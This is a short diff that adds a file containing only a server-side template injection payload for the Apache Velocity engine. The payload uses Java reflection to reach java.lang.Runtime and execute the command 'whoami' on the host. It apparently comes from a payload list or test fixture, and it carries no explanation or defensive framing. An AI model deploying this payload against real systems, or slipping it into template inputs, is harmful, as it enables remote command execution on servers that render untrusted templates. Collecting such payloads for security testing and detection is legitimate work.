@@ -1,0 +1,2 @@
+#set($e="e")
+$e.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(null, "whoami").toString()
